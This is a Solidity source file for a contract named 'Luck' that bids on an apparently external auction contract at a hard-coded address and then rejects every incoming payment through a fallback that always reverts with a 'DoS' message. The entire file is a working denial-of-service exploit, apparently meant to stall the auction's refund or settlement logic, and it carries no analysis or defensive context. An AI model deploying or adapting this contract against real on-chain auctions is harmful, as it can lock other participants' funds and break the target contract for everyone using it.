pragma solidity ^0.8.0;

interface IAku {
    function bid(uint8 amount) external payable;

    function getPrice() external view returns(uint80);
}

contract Luck {
    address private constant AKU = 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d;
    function luck() external payable {
        uint80 _price = IAku(AKU).getPrice();

        IAku(AKU).bid{value: _price}(1);
    }

    fallback() external payable {
        revert("Luck: DoS D0s");
    }
}